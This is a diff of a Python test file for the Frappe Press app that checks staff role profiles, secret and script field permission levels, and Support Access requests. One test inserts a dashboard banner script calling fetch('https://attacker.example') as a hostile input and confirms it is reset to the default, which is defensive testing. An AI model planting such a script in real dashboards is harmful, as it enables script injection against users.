@@ -6,12 +6,13 @@ from unittest.mock import patch
 import frappe
 from frappe.tests.utils import FrappeTestCase
 
+from press.press.doctype.site.test_site import create_test_site
 from press.press.doctype.team.team import Team
-from press.press.doctype.team.test_team import create_test_team
+from press.press.doctype.team.test_team import create_test_press_admin_team, create_test_team
 from press.press.doctype.team_deletion_request.team_deletion_request import TeamDeletionRequest
 
 SCOPE_ROLES = {
-	"Press Support",
+	"Press Support L1",
 	"Press Support Engineer",
 	"Press Infrastructure Manager",
 	"Press Release Manager",
@@ -108,7 +109,7 @@ SUPPORT_READS = [
 SUPPORT_DENIED = ["Payout Order", "Audit Log", "Wazuh Vulnerability", "SSH Certificate", "Cluster"]
 
 PROFILE_SCOPES = {
-	"Press Support": (SUPPORT_READS, SUPPORT_DENIED),
+	"Press Support L1": (SUPPORT_READS, SUPPORT_DENIED),
 	"Press Support Engineer": (SUPPORT_READS, SUPPORT_DENIED),
 	"Press Site Reliability Engineer": (
 		["Server", "Agent Job", "Site", "Bench"],
@@ -125,13 +126,11 @@ PROFILE_SCOPES = {
 
 def create_staff_user(*role_profiles: str) -> str:
 	user = frappe.new_doc("User")
-	user.email = frappe.mock("email")
-	user.first_name = "Staff"
-	user.send_welcome_email = 0
+	user.update({"email": frappe.mock("email"), "first_name": "Staff", "send_welcome_email": 0})
 	for role_profile in role_profiles:
 		user.append("role_profiles", {"role_profile": role_profile})
 	user.insert(ignore_permissions=True)
-	return user.name
+	return str(user.name)
 
 
 def press_doctype_roles() -> dict[str, set[str]]:
@@ -182,6 +181,41 @@ class TestStaffRoleScopes(FrappeTestCase):
 		)
 		self.assertEqual(profiles, [])
 
+	def test_employee_profile_gives_the_base_roles_of_every_employee(self):
+		roles = frappe.get_all(
+			"Has Role", {"parenttype": "Role Profile", "parent": "Press Employee"}, pluck="role"
+		)
+		self.assertEqual(set(roles), {"Press Employee", "Press User"})
+
+	def test_saving_an_employee_keeps_the_base_roles_next_to_a_job_profile(self):
+		user = frappe.get_doc("User", create_staff_user("Press Employee", "Press Support Engineer"))
+		user.save(ignore_permissions=True)
+		self.assertTrue(
+			{"Press Employee", "Press User", "Press Support Engineer"} <= set(frappe.get_roles(user.name))
+		)
+
+	def test_employee_role_only_requests_support_access(self):
+		granted = set(frappe.get_all("DocPerm", {"role": "Press Employee"}, pluck="parent"))
+		self.assertEqual(granted, {"Support Access"})
+
+	@patch("frappe.sendmail")
+	def test_employee_role_requests_access_to_a_site_that_it_cannot_read(self, _sendmail):
+		site = create_test_site(team=create_test_press_admin_team().name)
+		agent_team = create_test_press_admin_team()
+		agent = str(agent_team.user)
+		frappe.get_doc("User", agent).add_roles("Press Employee")  # type: ignore[attr-defined]
+		frappe.set_user(agent)
+		self.assertFalse(frappe.has_permission("Site", "read", site.name))
+		access = frappe.get_doc(
+			{
+				"doctype": "Support Access",
+				"requested_team": agent_team.name,
+				"reason": "Customer asked for help",
+				"resources": [{"document_type": "Site", "document_name": site.name}],
+			}
+		).insert()
+		self.assertEqual(access.get("requested_by"), agent)
+
 	def test_role_profile_reads_its_own_scope_and_not_other_scopes(self):
 		for profile, (allowed, denied) in PROFILE_SCOPES.items():
 			user = create_staff_user(profile)
@@ -231,8 +265,10 @@ class TestStaffRoleScopes(FrappeTestCase):
 				"action_script": "function onClickAction() { fetch('https://attacker.example') }",
 			}
 		).insert()
-		default_script = frappe.get_meta("Dashboard Banner").get_field("action_script").default
-		self.assertEqual(banner.action_script, default_script)
+		default_script = getattr(
+			frappe.get_meta("Dashboard Banner").get_field("action_script"), "default", None
+		)
+		self.assertEqual(banner.get("action_script"), default_script)
 
 	def test_only_ssh_and_infrastructure_profiles_can_create_ssh_certificates_and_keys(self):
 		own_only = {"Press Site Reliability Engineer", "Press Security Engineer"}
@@ -285,13 +321,15 @@ class TestStaffRoleScopes(FrappeTestCase):
 		for doctype, fieldnames in SECRET_FIELDS.items():
 			meta = frappe.get_meta(doctype)
 			with self.subTest(doctype=doctype):
-				self.assertEqual({meta.get_field(fieldname).permlevel for fieldname in fieldnames}, {1})
+				self.assertEqual(
+					{getattr(meta.get_field(fieldname), "permlevel", None) for fieldname in fieldnames}, {1}
+				)
 				readers = frappe.get_all(
 					"DocPerm", {"parent": doctype, "permlevel": 1, "read": 1}, pluck="role"
 				)
 				self.assertIn("System Manager", readers)
 				leaked = set(readers) & {
-					"Press Support",
+					"Press Support L1",
 					"Press Support Engineer",
 					"Press Infrastructure Manager",
 				}
@@ -301,7 +339,9 @@ class TestStaffRoleScopes(FrappeTestCase):
 		for doctype, fieldnames in SCRIPT_FIELDS.items():
 			meta = frappe.get_meta(doctype)
 			with self.subTest(doctype=doctype):
-				self.assertEqual({meta.get_field(fieldname).permlevel for fieldname in fieldnames}, {1})
+				self.assertEqual(
+					{getattr(meta.get_field(fieldname), "permlevel", None) for fieldname in fieldnames}, {1}
+				)
 				roles = frappe.get_all("DocPerm", {"parent": doctype, "permlevel": 1}, pluck="role")
 				self.assertEqual(set(roles), {"System Manager"})
 
@@ -326,7 +366,7 @@ class TestStaffRoleScopes(FrappeTestCase):
 
 	def test_support_can_request_deletion_of_a_team_they_do_not_own(self):
 		request = TeamDeletionRequest({"doctype": "Team Deletion Request", "team": create_test_team().name})
-		for profile in ("Press Support", "Press Support Engineer"):
+		for profile in ("Press Support L1", "Press Support Engineer"):
 			frappe.set_user(create_staff_user(profile))
 			request.validate_team_owner()
 
